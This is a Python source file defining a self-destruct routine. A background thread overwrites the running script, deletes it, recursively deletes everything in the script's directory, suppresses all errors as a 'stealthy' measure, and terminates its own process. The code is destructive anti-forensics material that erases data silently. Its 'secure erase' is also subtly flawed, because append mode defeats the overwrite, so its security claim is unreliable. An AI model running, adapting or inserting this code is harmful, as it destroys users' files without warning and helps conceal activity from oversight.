import os
import sys
import threading
import time
import shutil
import signal

def secure_erase_and_delete_self(delay=3, passes=3):
    def _wipe():
        time.sleep(delay)
        base_dir = os.path.dirname(os.path.abspath(sys.argv[0]))
        file_path = os.path.abspath(sys.argv[0])

        try:
            # Step 1: Securely wipe the main script
            if os.path.isfile(file_path):
                length = os.path.getsize(file_path)
                with open(file_path, "ba+", buffering=0) as f:
                    for _ in range(passes):
                        f.seek(0)
                        f.write(os.urandom(length))
                        f.flush()
                        os.fsync(f.fileno())
                os.remove(file_path)

            # Step 2: Delete all files and subdirs in current dir
            for item in os.listdir(base_dir):
                item_path = os.path.join(base_dir, item)
                try:
                    if os.path.isfile(item_path):
                        os.remove(item_path)
                    elif os.path.isdir(item_path):
                        shutil.rmtree(item_path)
                except Exception:
                    pass  # Silently skip protected or locked files

        except Exception:
            pass  # Stealthy fail-silent

        # Step 3: Kill the current process
        os.kill(os.getpid(), signal.SIGTERM)

    threading.Thread(target=_wipe, daemon=True).start()
